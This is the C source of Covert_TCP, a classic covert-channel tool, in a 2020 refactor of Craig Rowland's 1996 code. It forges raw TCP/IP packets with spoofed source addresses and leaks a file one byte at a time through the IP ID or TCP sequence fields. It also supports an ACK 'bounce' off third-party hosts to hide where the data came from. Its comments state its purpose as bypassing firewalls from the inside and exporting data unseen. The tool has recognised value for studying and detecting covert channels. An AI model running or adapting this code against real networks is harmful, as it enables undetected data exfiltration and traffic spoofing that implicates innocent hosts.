/* Refactored version of Craig H. Rowland's code by Shahira A. Azhar March 8, 2020
* Only refactored for optimization and ease of readability
* No difference in functionality from the original code
* 
* dependency: libpopt-dev
* compile: gcc -Wall -o covert_tcp covert_tcp.c -lpopt
*/



/* Covert_TCP 1.0 - Covert channel file transfer for Linux
* Written by Craig H. Rowland (crowland@psionic.com)
* Copyright 1996 Craig H. Rowland (11-15-96)
* NOT FOR COMMERCIAL USE WITHOUT PERMISSION. 
* 
*
* This program manipulates the TCP/IP header to transfer a file one byte
* at a time to a destination host. This progam can act as a server and a client
* and can be used to conceal transmission of data inside the IP header. 
* This is useful for bypassing firewalls from the inside, and for 
* exporting data with innocuous looking packets that contain no data for 
* sniffers to analyze. In other words, spy stuff... :)
*
* PLEASE see the enclosed paper for more information!!
*
* This software should be used at your own risk. 
*
* compile: cc -o covert_tcp covert_tcp.c
*
*
* 
* Portions of this code based on ping.c (c) 1987 Regents of the 
* University of California. (See function in_cksm() for details)
*
* Small portions from various packet utilities by unknown authors
*/

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>


#include <popt.h>

#define VERSION "1.0"

/* Function Definitions */
void forgeclient ( unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid, int seq );
void forgeserver (unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid, int seq, int ack);
unsigned short in_cksum ( unsigned short *ptr, int nbytes);
unsigned int host_convert ( char *hostname );

void forgeclient ( unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid, int seq )
{
	/* From synhose.c by knight */
	struct pseudo_header
	{
		unsigned int source_address;
		unsigned int dest_address;
		unsigned char placeholder;
		unsigned char protocol;
		unsigned short tcp_length;
		struct tcphdr tcp;
	} pseudo_header;

	struct send_tcp
	{
		struct iphdr ip;
		struct tcphdr tcp;
	} send_tcp;

	int ch;
	int send_socket;
	struct sockaddr_in sin;
	FILE *input;

	if((input=fopen(filename,"rb"))== NULL)
 	{
		 printf("ERROR: Cannot open the file %s for reading!\n",filename);
		 exit(1);
 	}

	/* Make the IP header with our forged information */
	send_tcp.ip.ihl 		= 5;
	send_tcp.ip.version 	= 4;
	send_tcp.ip.tos 		= 0;
	send_tcp.ip.tot_len 	= htons(40);
	send_tcp.ip.frag_off 	= 0;
	send_tcp.ip.ttl 		= 64; 
	send_tcp.ip.protocol 	= IPPROTO_TCP;
	send_tcp.ip.check 		= 0;
	send_tcp.ip.saddr 		= source_addr;
	send_tcp.ip.daddr 		= dest_addr;
	/* Make the TCP header with our forged information */
	/* NOTE: Other covert channels can use the following flags to encode data a BIT */
	/* at a time. A good example would be the use of the PSH flag setting to either */
	/* on or off and having the remote side decode the bytes accordingly... CHR */
	send_tcp.tcp.ack_seq 	= 0;
	send_tcp.tcp.res1 		= 0;
	send_tcp.tcp.doff 		= 5;
	send_tcp.tcp.fin 		= 0;
	send_tcp.tcp.syn 		= 1;
	send_tcp.tcp.rst 		= 0;
	send_tcp.tcp.psh 		= 0;
	send_tcp.tcp.ack 		= 0;
	send_tcp.tcp.urg 		= 0;
	send_tcp.tcp.res2 		= 0;
	send_tcp.tcp.check 		= 0;
	send_tcp.tcp.urg_ptr 	= 0;
	send_tcp.tcp.window 	= htons(512);

	/* From synhose.c by knight */
	pseudo_header.source_address	= send_tcp.ip.saddr;
	pseudo_header.dest_address 		= send_tcp.ip.daddr;
	pseudo_header.placeholder 		= 0;
	pseudo_header.protocol 			= IPPROTO_TCP;
	pseudo_header.tcp_length 		= htons(20);

	while (( ch=fgetc(input) ) !=EOF )
 	{
		sleep(1);

		/* NOTE: I am not using the proper byte order functions to initialize */
		/* some of these values (htons(), htonl(), etc.) and this will certainly */
		/* cause problems on other architectures. I didn't like doing a direct */
		/* translation of ASCII into the variables because this looked really */
		/* suspicious seeing packets with sequence numbers of 0-255 all the time */
		/* so I just read them in raw and let the function mangle them to fit its */
		/* needs... CHR */
	
		// IP ID Header encoding
		if ( ipid )
		{
			send_tcp.ip.id = ch;
			send_tcp.tcp.seq = 1 + ( int ) ( 10000.0 * rand() / ( RAND_MAX + 1.0 ));
		}
		// TCP Sequence Number encoding
		else
		{
			send_tcp.ip.id = ( int ) ( 255.0 * rand() / ( RAND_MAX + 1.0 ));
			send_tcp.tcp.seq = ch;
		}

		/* begin forged TCP header */
		if ( !source_port ) /* if the didn't supply a source port, we make one */
			send_tcp.tcp.source = 1 + ( int ) ( 10000.0 * rand() / ( RAND_MAX + 1.0 ));
		else /* otherwise use the one given */
			send_tcp.tcp.source = htons( source_port );

		/* forge destination port */
		send_tcp.tcp.dest = htons(dest_port);
	
		/* Drop our forged data into the socket struct */
		sin.sin_family = AF_INET;
		sin.sin_port = send_tcp.tcp.source;
		sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
		/* Now open the raw socket for sending */
		send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
		if(send_socket < 0)
		{
			perror("ERROR: Send socket cannot be opened. Are you root?");
			exit(1);
		}

		/* Make IP header checksum */
		send_tcp.ip.check = in_cksum( ( unsigned short *) & send_tcp.ip, 20);

		bcopy( ( char * ) & send_tcp.tcp, ( char * ) & pseudo_header.tcp, 20);
		/* Final checksum on the entire package */
		send_tcp.tcp.check = in_cksum( ( unsigned short * ) & pseudo_header, 32);

		/* Away we go.... */
		sendto(send_socket, &send_tcp, 40, 0, ( struct sockaddr * ) & sin, sizeof(sin));
		printf("INFO: Sending Data: %c\n",ch);

		close(send_socket);
	} /* end while(fgetc()) loop */
	fclose(input);
} /* end forgeclient() */

void forgeserver (unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid, int seq, int ack) 
{
	struct recv_tcp
	{
		struct iphdr ip;
		struct tcphdr tcp;
		char buffer[10000];
	} recv_pkt;

	int recv_socket;
	FILE *output;

	if((output=fopen(filename,"wb"))== NULL)
	{
		printf("ERROR: Cannot open the file %s for writing!\n",filename);
		exit(1);
	}

	/* Now we read the socket. This is not terribly fast at this time, and has the same */
	/* reliability as UDP as we do not ACK the packets for retries if they are bad. */
	/* This is just proof of concept... CHR*/

	while(1) /* read packet loop */
	{
		/* Open socket for reading */
		recv_socket = socket(AF_INET, SOCK_RAW, 6);
		if(recv_socket < 0)
		{
			perror("ERROR: Receive socket cannot be opened. Are you root?");
			exit(1);
		}
		/* Listen for return packet on a passive socket */
		read(recv_socket, (struct recv_tcp *)&recv_pkt, 9999);

		if ( recv_pkt.tcp.syn == 1 )
		{
			if ( recv_pkt.ip.saddr == source_addr  || ntohs(recv_pkt.tcp.dest) == source_port )
			{
				char data; 

				// IP ID number is converted from ASCII equivalent back to normal
				if ( ipid )
					data = recv_pkt.ip.id;
				// IP Sequence number "decoding"
				else if ( seq )
					data = recv_pkt.tcp.seq;
				/* Use a bounced packet from a remote server to decode the data */
				/* This technique requires that the client initiates a SEND to */
				/* a remote host with a SPOOFED source IP that is the location */
				/* of the listening server. The remote server will receive the packet */
				/* and will initiate an ACK of the packet with the encoded sequence */
				/* number+1 back to the SPOOFED source. The covert server is waiting at this */
				/* spoofed address and can decode the ack field to retrieve the data */
				/* this enables an "anonymous" packet transfer that can bounce */
				/* off any site. This is VERY hard to trace back to the originating */
				/* source. This is pretty nasty as far as covert channels go... */
				/* Some routers may not allow you to spoof an address outbound */
				/* that is not on their network, so it may not work at all sites... */
				/* SENDER should use covert_tcp with the -seq flag and a forged -source */
				/* address. RECEIVER should use the -server -ack flags with the IP of */
				/* of the server the bounced message will appear from.. CHR */

				/* The bounced ACK sequence number is really the original sequence*/
				/* plus one (ISN+1). However, the translation here drops some of the */
				/* bits so we get the original ASCII value...go figure.. */
				else if ( ack )
					data = recv_pkt.tcp.ack_seq;



				printf("INFO: Receiving Data: %c\n",data);
				fprintf(output,"%c",data); 
				fflush(output);
			}
		}
		close ( recv_socket );
	}
	fclose ( output );
} /* end forgeserver() */

// From ping.c: Copyright (c)1987 Regents of the University of California. 
unsigned short in_cksum ( unsigned short *ptr, int nbytes)
{
	register long		sum;		/* assumes long == 32 bits */
	u_short			    oddbyte;
	register u_short	answer;		/* assumes u_short == 16 bits */

	/*
	 * Our algorithm is simple, using a 32-bit accumulator (sum),
	 * we add sequential 16-bit words to it, and at the end, fold back
	 * all the carry bits from the top 16 bits into the lower 16 bits.
	 */

	sum = 0;
	while (nbytes > 1)  {
		sum += *ptr++;
		nbytes -= 2;
	}

    /* mop up an odd byte, if necessary */
	if (nbytes == 1) {
		oddbyte = 0;		/* make sure top half is zero */
		*((u_char *) &oddbyte) = *(u_char *)ptr;   /* one byte only */
		sum += oddbyte;
	}

	/*
	 * Add back carry outs from top 16 bits to low 16 bits.
	 */

	sum  = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
	sum += (sum >> 16);			/* add carry */
	answer = ~sum;		/* ones-complement, then truncate to 16 bits */
	return(answer);
} /* end in_cksum() */

// Generic resolver from unknown source
unsigned int host_convert ( char *hostname )
{
   static struct in_addr i;
   struct hostent *h;
   i.s_addr = inet_addr(hostname);
   if(i.s_addr == -1)
   {
      h = gethostbyname(hostname);
      if(h == NULL)
      {
         fprintf(stderr, "cannot resolve %s\n", hostname);
         exit(0);
      }
      bcopy(h->h_addr, (char *)&i.s_addr, h->h_length);
   }
   return i.s_addr;
} /* end resolver */

int main ( int argc, const char** argv )
{

   unsigned int source_host   = 0;
   unsigned int dest_host     = 0;
   unsigned int source_port = 0;
   unsigned int dest_port   = 80;
   int ipid   	= 0;
   int seq    	= 0;
   int ack    	= 0;
   int file   	= 0;
   int server 	= 0;
   char* desthost = (char *) malloc(80);
   char* srchost  = (char *) malloc(80);
   static char* filename = NULL;
   char c;

   struct poptOption optionsTable[] = 
   {
		{ "dest"        , 'd' , POPT_ARG_STRING , &desthost    , 'd' , "Set destination IP address" 				},
		{ "source"      , 's' , POPT_ARG_STRING , &srchost     , 's' , "Set source IP address"      				},
		{ "file"        , 'f' , POPT_ARG_STRING , &filename    , 'f' , "File to send"               				},
		{ "source_port" , 'j' , POPT_ARG_INT    , &source_port , 'j' , "Source port number"         				},
		{ "dest_port"   , 'k' , POPT_ARG_INT    , &dest_port   , 'k' , "Destination port number"    				},
		{ "ipid"        , 'i' , POPT_ARG_NONE   , NULL         , 'i' , "IPID Encoding"              				},
		{ "ack"         , 'a' , POPT_ARG_NONE   , NULL         , 'a' , "Flag for bouncing packet in covert channel" },
		{ "seq"         , 'q' , POPT_ARG_NONE   , NULL         , 'q' , "SEQ Encoding"               				},
		{ "server"      , 'S' , POPT_ARG_NONE   , NULL         , 'S' , "Run as server"              				},
	   	POPT_AUTOHELP
	   	POPT_TABLEEND
   };	

   poptContext optCon = poptGetContext( NULL, argc, argv, optionsTable, 0 );
   poptSetOtherOptionHelp( optCon, "[OPTIONS]" );
	
	while(( c = poptGetNextOpt( optCon )) >= 0 )
	{
		switch(c)
		{
			case 'd':
				dest_host=host_convert(desthost); 
				break;
			case 's':
				source_host=host_convert(srchost);
				break;
			case 'f':
				file=1;
				break;
			case 'i':
				ipid=1;
				break;
			case 'a':
				ack=1;
				break;
			case 'q':
				seq=1;
				break;
			case 'S':
				server=1;
				break;
			default:
				break;
		}
	}

  if ( getuid() != 0 )
   {
	    printf("You need to be root to run this.\n");
	    exit(1);
   }
   if ( !file )
   {
   		printf("ERROR: You must supply a filename (--file <filename>) \n");
   		exit(1);
   }

   // Requirements for Client Mode
   if ( !server )
   {
   		if ( ! ( dest_host || source_host ))
   		{
   			printf("ERROR: You must include a destination and source address when in client mode!\n");
	   		exit(1);
   		}
   		else if ( ack )
   		{
   			printf("ERROR: ack decoding can only be used in SERVER mode!\n");
   			exit(1);
   		}
   		else if ( !( ipid ^ seq ))
   		{
   			printf("ERROR: You must choose to encode either ipid or seq!\n");
   			exit(1);
   		}
   		else
   		{
   			printf("Destination Host: %s\n", desthost);
      		printf("Source Host     : %s\n", srchost);

      		if ( source_port == 0 )
      			printf("Originating Port: random\n");
      		else
      			printf("Originating Port: %u\n", source_port);

      		if ( ipid )
      			printf("Encoding Type   : IP ID\n");
      		else
      			printf("Encoding Type   : IP Sequence Number\n");

      		printf("\nClient Mode: Sending data.\n\n");
   		}
   }
   // Requirements for Server Mode
   else
   {
   		if ( ! ( source_host || source_port) )
   		{
   			printf("ERROR: You must supply a source address and/or port when in SERVER mode!\n");
   			exit(1);
   		}

   		if ( ! ( ipid ^ seq ^ ack ))
   		{
   			printf("ERROR: You must choose exactly one decoding method (ipid, seq, or ack)!\n");
   			exit(1);
   		}

   		if ( !source_host )
   		{
   			strcpy(srchost, "Any Host");
   		}
   		else if ( ! source_port )
   			printf("Listening for data bound for local port: Any Port\n");
   		else
   			printf("Listening for data bound for local port: %u\n", source_port);

   		if ( !dest_host )
   		{
   			strncpy(desthost,"Any Host", 10);
   		}

   		printf("Decoded Filename: %s\n", filename);
   		if ( ipid )
      		printf("Decoding Type Is: IP packet ID\n");
     	else if ( seq )
      		printf("Decoding Type Is: IP Sequence Number\n");
     	else 
      		printf("Decoding Type Is: IP ACK field bounced packet.\n");
      	printf("Server Mode: Listening for data.\n");

    }    
	
	// Initialize RNG for future use 
	srand( getpid() * time(0) ); 
	if ( server )
    	forgeserver ( source_host, dest_host, source_port, dest_port, filename, ipid, seq, ack );
    else
    	forgeclient ( source_host, dest_host, source_port, dest_port, filename, ipid, seq );

    return 0;

} /* end main() */

/* The End */
         


